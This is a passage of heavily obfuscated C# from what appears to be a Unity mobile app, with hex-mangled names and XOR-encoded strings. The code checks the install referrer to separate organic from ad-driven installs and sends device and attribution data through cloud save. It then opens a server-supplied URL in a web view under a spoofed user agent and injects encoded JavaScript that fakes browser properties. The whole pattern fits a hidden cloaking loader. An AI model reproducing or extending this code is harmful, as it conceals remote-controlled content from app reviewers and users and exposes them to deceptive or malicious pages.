                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[44] { 109, 98, 83, 69, 66, 107, 22, 115, 78, 85, 83, 70, 66, 95, 89, 88, 22, 65, 94, 95, 90, 83, 22, 85, 94, 83, 85, 93, 95, 88, 81, 22, 69, 87, 64, 83, 82, 22, 90, 95, 88, 93, 12, 22 }, 54) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    internal bool firstLoadShown = false;
    private string _0x4e4d1e58 = "";
    private string _0x8c3ab9a1 { get; set; }

    internal Button _0x2ca06ec9(string _0x991abe0d, Transform _0x6de287fe)
    {
        var _0x54fce26a = new GameObject(_0x991abe0d + _0x6938ded6._0xbdc404bd(new byte[3] { 178, 132, 158 }, 240), typeof(RectTransform), typeof(Image), typeof(Button));
        var _0xe829bdeb = _0x54fce26a.GetComponent<RectTransform>();
        _0xe829bdeb.SetParent(_0x6de287fe, false);
        var _0xe1c849a2 = _0x54fce26a.GetComponent<Image>();
        _0xe1c849a2.color = new Color(0.92f, 0.92f, 0.95f, 1f);
        var _0xbbd478d4 = _0x54fce26a.GetComponent<Button>();
        var _0x675c7a61 = _0xbbd478d4.colors;
        _0x675c7a61.highlightedColor = new Color(0.85f, 0.85f, 0.9f);
        _0x675c7a61.pressedColor = new Color(0.8f, 0.8f, 0.88f);
        _0xbbd478d4.colors = _0x675c7a61;
        var _0xe17c40e1 = new GameObject(_0x6938ded6._0xbdc404bd(new byte[4] { 138, 187, 166, 170 }, 222), typeof(RectTransform), typeof(Text));
        var _0xabf15135 = _0xe17c40e1.GetComponent<RectTransform>();
        _0xabf15135.SetParent(_0x54fce26a.transform, false);
        _0xabf15135.anchorMin = Vector2.zero;
        _0xabf15135.anchorMax = Vector2.one;
        _0xabf15135.offsetMin = _0xabf15135.offsetMax = Vector2.zero;
        var _0x47abeccf = _0xe17c40e1.GetComponent<Text>();
        _0x47abeccf.text = _0x991abe0d;
        _0x47abeccf.alignment = TextAnchor.MiddleCenter;
        _0x47abeccf.color = Color.black;
        _0x47abeccf.font = Resources.GetBuiltinResource<Font>(_0x6938ded6._0xbdc404bd(new byte[9] { 11, 56, 35, 43, 38, 100, 62, 62, 44 }, 74));
        _0x47abeccf.fontSize = 28;
        WLog(_0x6938ded6._0xbdc404bd(new byte[14] { 130, 179, 164, 160, 181, 164, 131, 180, 181, 181, 174, 175, 225, 230 }, 193) + _0x991abe0d + _0x6938ded6._0xbdc404bd(new byte[1] { 239 }, 200));
        return _0xbbd478d4;
    }

    private int _0xfc50c348 = 0;
    private string _0x4c49f262 = "";
    private void OnApplicationPause(bool _0x23524ed2)
    {
        isApplicationPause = _0x23524ed2;
    }

    private void OnDestroy()
    {
        StopAllCoroutines();
        _0x816ea96e();
    }

    private string _0xfcc68d7f = "";
    private string _0x45024f6e()
    {
        return _0x6938ded6._0xbdc404bd(new byte[12] { 220, 146, 129, 154, 151, 128, 157, 155, 154, 220, 221, 143 }, 244) + _0x6938ded6._0xbdc404bd(new byte[8] { 74, 93, 78, 28, 73, 93, 1, 27 }, 60) + WindowsDesktopUserAgent + _0x6938ded6._0xbdc404bd(new byte[2] { 113, 109 }, 86) + _0x6938ded6._0xbdc404bd(new byte[30] { 32, 55, 36, 118, 38, 36, 57, 34, 57, 107, 24, 55, 32, 63, 49, 55, 34, 57, 36, 120, 38, 36, 57, 34, 57, 34, 47, 38, 51, 109 }, 86) + _0x6938ded6._0xbdc404bd(new byte[121] { 33, 50, 41, 36, 51, 46, 40, 41, 103, 35, 34, 33, 111, 40, 37, 45, 107, 44, 34, 62, 107, 49, 38, 43, 110, 60, 51, 53, 62, 60, 8, 37, 45, 34, 36, 51, 105, 35, 34, 33, 46, 41, 34, 23, 53, 40, 55, 34, 53, 51, 62, 111, 40, 37, 45, 107, 44, 34, 62, 107, 60, 32, 34, 51, 125, 33, 50, 41, 36, 51, 46, 40, 41, 111, 110, 60, 53, 34, 51, 50, 53, 41, 103, 49, 38, 43, 124, 58, 107, 36, 40, 41, 33, 46, 32, 50, 53, 38, 37, 43, 34, 125, 51, 53, 50, 34, 58, 110, 124, 58, 36, 38, 51, 36, 47, 111, 34, 110, 60, 58, 58 }, 71) + _0x6938ded6._0xbdc404bd(new byte[26] { 240, 241, 242, 188, 228, 230, 251, 224, 251, 184, 179, 225, 231, 241, 230, 213, 243, 241, 250, 224, 179, 184, 225, 245, 189, 175 }, 148) + _0x6938ded6._0xbdc404bd(new byte[130] { 250, 251, 248, 182, 238, 236, 241, 234, 241, 178, 185, 255, 238, 238, 200, 251, 236, 237, 247, 241, 240, 185, 178, 185, 171, 176, 174, 190, 182, 201, 247, 240, 250, 241, 233, 237, 190, 208, 202, 190, 175, 174, 176, 174, 165, 190, 201, 247, 240, 168, 170, 165, 190, 230, 168, 170, 183, 190, 223, 238, 238, 242, 251, 201, 251, 252, 213, 247, 234, 177, 171, 173, 169, 176, 173, 168, 190, 182, 213, 214, 202, 211, 210, 178, 190, 242, 247, 245, 251, 190, 217, 251, 253, 245, 241, 183, 190, 221, 246, 236, 241, 243, 251, 177, 175, 172, 174, 176, 174, 176, 174, 176, 174, 190, 205, 255, 248, 255, 236, 247, 177, 171, 173, 169, 176, 173, 168, 185, 183, 165 }, 158) + _0x6938ded6._0xbdc404bd(new byte[30] { 29, 28, 31, 81, 9, 11, 22, 13, 22, 85, 94, 9, 21, 24, 13, 31, 22, 11, 20, 94, 85, 94, 46, 16, 23, 74, 75, 94, 80, 66 }, 121) + _0x6938ded6._0xbdc404bd(new byte[34] { 51, 50, 49, 127, 39, 37, 56, 35, 56, 123, 112, 33, 50, 57, 51, 56, 37, 112, 123, 112, 16, 56, 56, 48, 59, 50, 119, 30, 57, 52, 121, 112, 126, 108 }, 87) + _0x6938ded6._0xbdc404bd(new byte[30] { 233, 232, 235, 165, 253, 255, 226, 249, 226, 161, 170, 224, 236, 245, 217, 226, 248, 238, 229, 221, 226, 228, 227, 249, 254, 170, 161, 189, 164, 182 }, 141) + _0x6938ded6._0xbdc404bd(new byte[449] { 8, 14, 5, 7, 10, 29, 14, 92, 9, 29, 24, 65, 7, 30, 14, 29, 18, 24, 15, 70, 39, 7, 30, 14, 29, 18, 24, 70, 91, 63, 20, 14, 19, 17, 21, 9, 17, 91, 80, 10, 25, 14, 15, 21, 19, 18, 70, 91, 77, 78, 76, 91, 1, 80, 7, 30, 14, 29, 18, 24, 70, 91, 59, 19, 19, 27, 16, 25, 92, 63, 20, 14, 19, 17, 25, 91, 80, 10, 25, 14, 15, 21, 19, 18, 70, 91, 77, 78, 76, 91, 1, 80, 7, 30, 14, 29, 18, 24, 70, 91, 50, 19, 8, 65, 61, 67, 62, 14, 29, 18, 24, 91, 80, 10, 25, 14, 15, 21, 19, 18, 70, 91, 78, 72, 91, 1, 33, 80, 17, 19, 30, 21, 16, 25, 70, 26, 29, 16, 15, 25, 80, 12, 16, 29, 8, 26, 19, 14, 17, 70, 91, 43, 21, 18, 24, 19, 11, 15, 91, 80, 27, 25, 8, 52, 21, 27, 20, 57, 18, 8, 14, 19, 12, 5, 42, 29, 16, 9, 25, 15, 70, 26, 9, 18, 31, 8, 21, 19, 18, 84, 85, 7, 14, 25, 8, 9, 14, 18, 92, 44, 14, 19, 17, 21, 15, 25, 82, 14, 25, 15, 19, 16, 10, 25, 84, 7, 29, 14, 31, 20, 21, 8, 25, 31, 8, 9, 14, 25, 70, 91, 4, 68, 74, 91, 80, 30, 21, 8, 18, 25, 15, 15, 70, 91, 74, 72, 91, 80, 17, 19, 30, 21, 16, 25, 70, 26, 29, 16, 15, 25, 80, 17, 19, 24, 25, 16, 70, 91, 91, 80, 12, 16, 29, 8, 26, 19, 14, 17, 70, 91, 43, 21, 18, 24, 19, 11, 15, 91, 80, 12, 16, 29, 8, 26, 19, 14, 17, 42, 25, 14, 15, 21, 19, 18, 70, 91, 77, 73, 82, 76, 82, 76, 91, 80, 9, 29, 58, 9, 16, 16, 42, 25, 14, 15, 21, 19, 18, 70, 91, 77, 78, 76, 82, 76, 82, 76, 82, 76, 91, 1, 85, 71, 1, 1, 71, 51, 30, 22, 25, 31, 8, 82, 24, 25, 26, 21, 18, 25, 44, 14, 19, 12, 25, 14, 8, 5, 84, 12, 14, 19, 8, 19, 80, 91, 9, 15, 25, 14, 61, 27, 25, 18, 8, 56, 29, 8, 29, 91, 80, 7, 27, 25, 8, 70, 26, 9, 18, 31, 8, 21, 19, 18, 84, 85, 7, 14, 25, 8, 9, 14, 18, 92, 9, 29, 24, 71, 1, 80, 31, 19, 18, 26, 21, 27, 9, 14, 29, 30, 16, 25, 70, 8, 14, 9, 25, 1, 85, 71, 1, 31, 29, 8, 31, 20, 84, 25, 85, 7, 1 }, 124) + _0x6938ded6._0xbdc404bd(new byte[112] { 232, 233, 234, 164, 255, 239, 254, 233, 233, 226, 160, 171, 251, 229, 232, 248, 228, 171, 160, 189, 181, 190, 188, 165, 183, 232, 233, 234, 164, 255, 239, 254, 233, 233, 226, 160, 171, 228, 233, 229, 235, 228, 248, 171, 160, 189, 188, 180, 188, 165, 183, 232, 233, 234, 164, 255, 239, 254, 233, 233, 226, 160, 171, 237, 250, 237, 229, 224, 219, 229, 232, 248, 228, 171, 160, 189, 181, 190, 188, 165, 183, 232, 233, 234, 164, 255, 239, 254, 233, 233, 226, 160, 171, 237, 250, 237, 229, 224, 196, 233, 229, 235, 228, 248, 171, 160, 189, 188, 184, 188, 165, 183 }, 140) + _0x6938ded6._0xbdc404bd(new byte[45] { 207, 201, 194, 192, 204, 210, 213, 223, 212, 204, 149, 212, 213, 207, 212, 206, 216, 211, 200, 207, 218, 201, 207, 134, 206, 213, 223, 222, 221, 210, 213, 222, 223, 128, 198, 216, 218, 207, 216, 211, 147, 222, 146, 192, 198 }, 187) + _0x6938ded6._0xbdc404bd(new byte[721] { 81, 87, 92, 94, 83, 68, 87, 5, 74, 87, 76, 66, 24, 82, 76, 75, 65, 74, 82, 11, 72, 68, 81, 70, 77, 104, 64, 65, 76, 68, 11, 71, 76, 75, 65, 13, 82, 76, 75, 65, 74, 82, 12, 30, 82, 76, 75, 65, 74, 82, 11, 72, 68, 81, 70, 77, 104, 64, 65, 76, 68, 24, 67, 80, 75, 70, 81, 76, 74, 75, 13, 84, 12, 94, 83, 68, 87, 5, 86, 24, 118, 81, 87, 76, 75, 66, 13, 84, 12, 11, 81, 74, 105, 74, 82, 64, 87, 102, 68, 86, 64, 13, 12, 30, 76, 67, 13, 86, 11, 76, 75, 65, 64, 93, 106, 67, 13, 2, 85, 74, 76, 75, 81, 64, 87, 31, 5, 70, 74, 68, 87, 86, 64, 2, 12, 27, 24, 21, 89, 89, 86, 11, 76, 75, 65, 64, 93, 106, 67, 13, 2, 77, 74, 83, 64, 87, 31, 5, 75, 74, 75, 64, 2, 12, 27, 24, 21, 89, 89, 86, 11, 76, 75, 65, 64, 93, 106, 67, 13, 2, 72, 68, 93, 8, 82, 76, 65, 81, 77, 2, 12, 27, 24, 21, 89, 89, 86, 11, 76, 75, 65, 64, 93, 106, 67, 13, 2, 72, 68, 93, 8, 65, 64, 83, 76, 70, 64, 8, 82, 76, 65, 81, 77, 2, 12, 27, 24, 21, 12, 87, 64, 81, 80, 87, 75, 5, 94, 72, 68, 81, 70, 77, 64, 86, 31, 67, 68, 73, 86, 64, 9, 72, 64, 65, 76, 68, 31, 84, 9, 74, 75, 70, 77, 68, 75, 66, 64, 31, 75, 80, 73, 73, 9, 68, 65, 65, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 87, 64, 72, 74, 83, 64, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 68, 65, 65, 96, 83, 64, 75, 81, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 87, 64, 72, 74, 83, 64, 96, 83, 64, 75, 81, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 65, 76, 86, 85, 68, 81, 70, 77, 96, 83, 64, 75, 81, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 87, 64, 81, 80, 87, 75, 5, 67, 68, 73, 86, 64, 30, 88, 88, 30, 76, 67, 13, 86, 11, 76, 75, 65, 64, 93, 106, 67, 13, 2, 85, 74, 76, 75, 81, 64, 87, 31, 5, 67, 76, 75, 64, 2, 12, 27, 24, 21, 89, 89, 86, 11, 76, 75, 65, 64, 93, 106, 67, 13, 2, 77, 74, 83, 64, 87, 31, 5, 77, 74, 83, 64, 87, 2, 12, 27, 24, 21, 12, 87, 64, 81, 80, 87, 75, 5, 94, 72, 68, 81, 70, 77, 64, 86, 31, 81, 87, 80, 64, 9, 72, 64, 65, 76, 68, 31, 84, 9, 74, 75, 70, 77, 68, 75, 66, 64, 31, 75, 80, 73, 73, 9, 68, 65, 65, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 87, 64, 72, 74, 83, 64, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 68, 65, 65, 96, 83, 64, 75, 81, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 87, 64, 72, 74, 83, 64, 96, 83, 64, 75, 81, 105, 76, 86, 81, 64, 75, 64, 87, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 88, 9, 65, 76, 86, 85, 68, 81, 70, 77, 96, 83, 64, 75, 81, 31, 67, 80, 75, 70, 81, 76, 74, 75, 13, 12, 94, 87, 64, 81, 80, 87, 75, 5, 67, 68, 73, 86, 64, 30, 88, 88, 30, 87, 64, 81, 80, 87, 75, 5, 74, 87, 76, 66, 13, 84, 12, 30, 88, 30, 88, 70, 68, 81, 70, 77, 13, 64, 12, 94, 88 }, 37) + _0x6938ded6._0xbdc404bd(new byte[5] { 69, 17, 16, 17, 3 }, 56);
    }

    private string _0xaeed1bf4()
    {
        float _0x3c79b3c1 = Time.realtimeSinceStartup;
        if (_0x3c79b3c1 < 0f)
            _0x3c79b3c1 = 0f;
        int _0xb19ee1d8 = (int)(_0x3c79b3c1 * 1000f);
        int _0x27927d71 = _0xb19ee1d8 / 60000;
        int _0x837dbc8f = (_0xb19ee1d8 / 1000) % 60;
        int _0x0ed05a43 = _0xb19ee1d8 % 1000;
        return string.Format(_0x6938ded6._0xbdc404bd(new byte[21] { 64, 11, 1, 11, 11, 70, 1, 64, 10, 1, 11, 11, 70, 1, 64, 9, 1, 11, 11, 11, 70 }, 59), _0x27927d71, _0x837dbc8f, _0x0ed05a43);
    }

    private readonly List<UniWebViewPopup> _0x0a749e0b = new List<UniWebViewPopup>();
    private string _0xee973056 = "";
    // WEB VIEW LOGIC
    public bool _0xad6479a6 { get; set; }

    private string Decrypt(string _0x18ad0ac6, string _0xc65ee502)
    {
        try
        {
            var _0x9bc48115 = Convert.FromBase64String(_0x18ad0ac6);
            using var _0x5ff7d29e = Aes.Create();
            _0x5ff7d29e.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0xc65ee502));
            var _0x066feb34 = new byte[16];
            Buffer.BlockCopy(_0x9bc48115, 0, _0x066feb34, 0, 16);
            _0x5ff7d29e.IV = _0x066feb34;
            using var _0xa5659fc5 = new MemoryStream(_0x9bc48115, 16, _0x9bc48115.Length - 16);
            using var _0x50a56bda = new CryptoStream(_0xa5659fc5, _0x5ff7d29e.CreateDecryptor(), CryptoStreamMode.Read);
            using var _0x1f2a4d23 = new StreamReader(_0x50a56bda, Encoding.UTF8);
            return _0x1f2a4d23.ReadToEnd();
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private bool _0x658f852a()
    {
        _0x0a749e0b.RemoveAll(_0xb6894b3d => _0xb6894b3d == null || !_0xb6894b3d.IsAlive);
        return _0x0a749e0b.Count > 0;
    }

    private async Task _0x8850e7e3()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0xee973056 = _0x6938ded6._0xbdc404bd(new byte[5] { 174, 169, 164, 187, 173 }, 200);
        _0xf3c53283 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x26a71097 = DateTime.UtcNow.Ticks.ToString();
        _0x0ea3f72d = "";
        JObject _0xdf20742d = BuildRandomPayload(_0xfcc68d7f, _0xaf1051ad, _0x7d45dc73, _0x8c66a763, _0x9429181c, _0x4208a47a, _0x8c3ab9a1, _0x4c49f262, _0x4e4d1e58, _0x504046eb, _0xee973056, _0x0ea3f72d, _0x6f497917, _0x2571d61a, _0x44ce2c12.ToString(), _0xeba73b7d, _0x26a71097, _0xf3c53283, _0xedebd1d4, _0x932c2ce6, _0x5fbdd8dd, _0xf1c054b2, _0xaeed1bf4());
        var _0x5bbfc8ae = _0x37814e7b(_0xdf20742d.ToString(), _0xedebd1d4);
        {
#if B_LOGS
            {
                Debug.Log($"[Test][First Run] Send Payload for first run: {_0xdf20742d}");
            }
#endif
        }

        try
        {
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x6938ded6._0xbdc404bd(new byte[7] { 6, 23, 15, 26, 25, 23, 18 }, 118) + _0xedebd1d4, _0x5bbfc8ae } });
            await Task.Delay(500);
            string _0xa72c3df2 = "";
            for (int _0xb005d6fb = 0; _0xb005d6fb < 20; _0xb005d6fb++)
            {
                if (await _0x4424fcb3(1, 1))
                {
                    await _0x3377193a(_0x6938ded6._0xbdc404bd(new byte[7] { 87, 89, 90, 86, 94, 80, 81 }, 53));
                    _0x816ea96e();
                    return;
                }

                _0xa72c3df2 = await _0x1e44a33c(1, 500);
                if (!string.IsNullOrEmpty(_0xa72c3df2))
                    break;
            }

            _0x6953bc5a(_0xa72c3df2);
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[22] { 104, 103, 118, 96, 103, 110, 19, 116, 86, 93, 86, 65, 82, 95, 19, 86, 65, 65, 92, 65, 9, 19 }, 51) + e.Message);
#endif
            }

            _0x816ea96e();
        }
    }

    private void _0xb916ebe7(string _0x7a1bc5fe)
    {
        _0x48bc8dc0();
        StartCoroutine(_0x84844228(_0x7a1bc5fe));
    }

    private bool _0x1a92e41c(string _0xe5276da8, string _0x8ad2be5c)
    {
        string _0x231501e0 = _0x97a33dca(_0xe5276da8);
        if (string.IsNullOrEmpty(_0x231501e0))
            _0x231501e0 = _0x8ad2be5c;
        if (_0x6e8074aa(_0x231501e0))
            return true;
        string _0x07cd798a = string.IsNullOrEmpty(_0x231501e0) ? _0x6938ded6._0xbdc404bd(new byte[29] { 169, 181, 181, 177, 178, 251, 238, 238, 177, 173, 160, 184, 239, 166, 174, 174, 166, 173, 164, 239, 162, 174, 172, 238, 178, 181, 174, 179, 164 }, 193) : _0x6938ded6._0xbdc404bd(new byte[46] { 198, 218, 218, 222, 221, 148, 129, 129, 222, 194, 207, 215, 128, 201, 193, 193, 201, 194, 203, 128, 205, 193, 195, 129, 221, 218, 193, 220, 203, 129, 207, 222, 222, 221, 129, 202, 203, 218, 207, 199, 194, 221, 145, 199, 202, 147 }, 174) + _0x231501e0;
        WLog(_0x6938ded6._0xbdc404bd(new byte[35] { 217, 242, 232, 245, 247, 255, 214, 243, 241, 255, 186, 247, 251, 232, 241, 255, 238, 186, 252, 251, 246, 246, 248, 251, 249, 241, 186, 251, 233, 186, 237, 255, 248, 160, 186 }, 154) + _0x07cd798a);
        return _0x99999d7a(_0x07cd798a);
    }

    private IEnumerator _0x8f95c7bb()
    {
        {
#if B_LOGS
            {
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[26] { 153, 150, 167, 177, 182, 159, 226, 139, 172, 171, 182, 171, 163, 174, 171, 184, 167, 144, 167, 164, 164, 167, 176, 167, 176, 226 }, 194));
            }
#endif
        }

        bool _0x3f478c2a = false;
        InstallReferrer.GetReferrer((_0x93a6d6aa) =>
        {
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[24] { 127, 112, 65, 87, 80, 4, 118, 65, 66, 65, 86, 86, 65, 86, 121, 4, 67, 65, 80, 4, 198, 162, 182, 4 }, 36) + _0x9429181c);
            if (_0x93a6d6aa.IsSuccess)
            {
                _0x9429181c = _0x93a6d6aa.InstallReferrer ?? "";
                {
#if B_LOGS
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[28] { 118, 121, 72, 94, 89, 13, 127, 72, 75, 72, 95, 95, 72, 95, 112, 13, 126, 88, 78, 78, 72, 94, 94, 13, 207, 171, 191, 13 }, 45) + _0x9429181c);
#endif
                }
            }
            else
            {
                {
#if B_LOGS
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[27] { 83, 92, 109, 123, 124, 40, 90, 109, 110, 109, 122, 122, 109, 122, 85, 40, 78, 105, 97, 100, 109, 108, 40, 234, 142, 154, 40 }, 8) + _0x93a6d6aa);
#endif
                }

                _0x9429181c = "";
            }

            _0x90914ba6 = true;
        });
        StartCoroutine(_0x02a6f1d9(2f));
        yield return new WaitUntil(() => _0x90914ba6);
        {
#if B_LOGS
            Debug.Log($"[Test] check google atr {_0x9429181c}");
#endif
        }

        bool _0xaa45afbd = _0x9429181c.Contains(_0x6938ded6._0xbdc404bd(new byte[6] { 123, 127, 112, 117, 120, 33 }, 28));
        _0x3f478c2a = _0xaa45afbd || _0x9429181c.Contains(_0x6938ded6._0xbdc404bd(new byte[18] { 31, 14, 14, 13, 80, 23, 16, 13, 10, 31, 25, 12, 31, 19, 80, 29, 17, 19 }, 126)) || _0x9429181c.Contains(_0x6938ded6._0xbdc404bd(new byte[17] { 157, 140, 140, 143, 210, 154, 157, 159, 153, 158, 147, 147, 151, 210, 159, 147, 145 }, 252));
        _0x4208a47a = _0xaa45afbd ? "" : (_0x3f478c2a ? "" : _0x4208a47a);
        _0x4208a47a = _0x4208a47a ?? "";
        _0x8c3ab9a1 = _0x8c3ab9a1 ?? "";
        {
#if B_LOGS
            Debug.Log($"[Test] oneLinkData (FB): {_0x4208a47a}");
#endif
        }
    }

    private void _0xacdbb011()
    {
        if (_0x8b5683d0 == null)
            return;
        if (_0x5b7f34c9)
            _0x8b5683d0.SetUserAgent(_0xf5082241());
        else
            _0x8b5683d0.SetUserAgent("");
    }

    private bool _0x3eaadd85 = false;
    private bool _0xed369528(int _0x485e9ef1, string _0x5d77547f, string _0x3a27cb28)
    {
        if (string.IsNullOrEmpty(_0x3a27cb28))
            return false;
        if (!IsHttpUrl(_0x3a27cb28))
            return true;
        if (string.IsNullOrEmpty(_0x5d77547f))
            return false;
        return _0x5d77547f.IndexOf(_0x6938ded6._0xbdc404bd(new byte[20] { 41, 62, 62, 51, 47, 35, 34, 34, 41, 47, 56, 37, 35, 34, 51, 62, 41, 63, 41, 56 }, 108), StringComparison.OrdinalIgnoreCase) >= 0 || _0x5d77547f.IndexOf(_0x6938ded6._0xbdc404bd(new byte[22] { 134, 145, 145, 156, 128, 140, 141, 141, 134, 128, 151, 138, 140, 141, 156, 145, 134, 133, 150, 144, 134, 135 }, 195), StringComparison.OrdinalIgnoreCase) >= 0 || _0x5d77547f.IndexOf(_0x6938ded6._0xbdc404bd(new byte[21] { 145, 134, 134, 139, 151, 155, 154, 154, 145, 151, 128, 157, 155, 154, 139, 151, 152, 155, 135, 145, 144 }, 212), StringComparison.OrdinalIgnoreCase) >= 0 || _0x5d77547f.IndexOf(_0x6938ded6._0xbdc404bd(new byte[22] { 237, 250, 250, 247, 253, 230, 227, 230, 231, 255, 230, 247, 253, 250, 228, 247, 251, 235, 224, 237, 229, 237 }, 168), StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private async Task<bool> _0xa4751a89()
    {
        {
#if B_LOGS
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[37] { 99, 108, 93, 75, 76, 101, 24, 107, 81, 95, 86, 113, 86, 109, 86, 81, 76, 65, 107, 93, 74, 78, 81, 91, 93, 75, 121, 86, 87, 86, 65, 85, 87, 77, 75, 84, 65 }, 56));
#endif
        }

        try
        {
            var _0x7ba94101 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x7ba94101);
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[32] { 245, 250, 203, 221, 218, 243, 142, 251, 192, 199, 218, 215, 253, 203, 220, 216, 199, 205, 203, 221, 142, 231, 192, 199, 218, 199, 207, 194, 199, 212, 203, 202 }, 174));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[20] { 157, 140, 154, 157, 233, 156, 167, 160, 189, 176, 154, 172, 187, 191, 160, 170, 172, 186, 243, 233 }, 201) + ex.Message);
#endif
            }

            _0x562e499c?._0x816ea96e();
            return true;
        }

        bool _0x1d0aeec5 = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x1d0aeec5 = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x6938ded6._0xbdc404bd(new byte[37] { 10, 5, 52, 34, 37, 12, 113, 2, 56, 54, 63, 124, 56, 63, 113, 16, 63, 62, 63, 40, 60, 62, 36, 34, 127, 113, 1, 61, 48, 40, 52, 35, 113, 24, 21, 107, 113 }, 81) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0xedebd1d4 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[25] { 36, 53, 35, 36, 80, 35, 25, 23, 30, 93, 25, 30, 80, 49, 5, 4, 24, 80, 53, 34, 34, 63, 34, 74, 80 }, 112) + ex.Message);
#endif
                }

                _0x562e499c?._0x816ea96e();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[28] { 123, 106, 124, 123, 15, 124, 70, 72, 65, 2, 70, 65, 15, 125, 74, 94, 90, 74, 92, 91, 15, 106, 125, 125, 96, 125, 21, 15 }, 47) + ex.Message);
#endif
                }

                _0x562e499c?._0x816ea96e();
                return true;
            }
        }
        while (!_0x1d0aeec5);
        return false;
    }

    internal bool isApplicationPause = false;
    private IEnumerator _0x1ba6bb7e(Dictionary<string, object> _0x15d92154)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[30] { 90, 85, 100, 114, 117, 92, 33, 71, 100, 117, 98, 105, 33, 68, 121, 117, 115, 96, 33, 81, 116, 114, 105, 33, 69, 96, 117, 96, 59, 33 }, 1) + string.Join(_0x6938ded6._0xbdc404bd(new byte[1] { 48 }, 57), _0x15d92154));
#endif
            }
        }

        string _0x672c1cb5 = "";
        // Primary source: nested JSON under "notificationData"
        if (_0x15d92154 != null && _0x15d92154.TryGetValue(_0x6938ded6._0xbdc404bd(new byte[16] { 109, 108, 119, 106, 101, 106, 96, 98, 119, 106, 108, 109, 71, 98, 119, 98 }, 3), out var raw))
        {
            try
            {
                var _0xf33313ba = raw?.ToString();
                var _0x425d0255 = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0xf33313ba);
                if (_0x425d0255 != null && _0x425d0255.TryGetValue(_0x6938ded6._0xbdc404bd(new byte[6] { 15, 25, 18, 24, 21, 24 }, 124), out var val))
                {
                    _0x672c1cb5 = val?.ToString();
                }
            }
            catch (Exception e)
            {
#if B_LOGS
                Debug.LogError(_0x6938ded6._0xbdc404bd(new byte[30] { 194, 205, 252, 234, 237, 185, 201, 236, 234, 241, 196, 185, 211, 202, 214, 215, 185, 233, 248, 235, 234, 252, 185, 252, 235, 235, 246, 235, 163, 185 }, 153) + e);
#endif
            }
        }

        // Fallback: flat structure
        if (string.IsNullOrEmpty(_0x672c1cb5) && _0x15d92154 != null && _0x15d92154.TryGetValue(_0x6938ded6._0xbdc404bd(new byte[6] { 166, 176, 187, 177, 188, 177 }, 213), out var lab))
        {
            _0x672c1cb5 = lab?.ToString();
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[38] { 220, 211, 226, 244, 243, 167, 215, 242, 244, 239, 218, 167, 193, 226, 243, 228, 239, 226, 227, 167, 244, 226, 233, 227, 238, 227, 167, 225, 245, 232, 234, 167, 237, 244, 232, 233, 189, 167 }, 135) + _0x672c1cb5);
            }
#endif
        }

        if (string.IsNullOrEmpty(_0x672c1cb5))
            yield break;
        {
#if B_LOGS
            {
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[38] { 13, 2, 51, 37, 34, 118, 6, 35, 37, 62, 11, 118, 1, 55, 63, 34, 118, 34, 57, 118, 57, 38, 51, 56, 118, 33, 63, 34, 62, 118, 37, 51, 56, 50, 63, 50, 108, 118 }, 86) + _0x672c1cb5);
            }
#endif
        }

        _0x47f4b2cf = _0x672c1cb5;
        yield return new WaitUntil(() => _0xad6479a6);
        var _0xd18af12b = _0x1e44a33c(2, 100);
        yield return new WaitUntil(() => _0xd18af12b.IsCompleted);
        string _0x6b47b3fd = _0xd18af12b.Result;
        if (!string.IsNullOrEmpty(_0x6b47b3fd))
        {
            string _0x9d011e67 = _0xf4796fa5(_0x6b47b3fd, _0x672c1cb5);
            {
#if B_LOGS
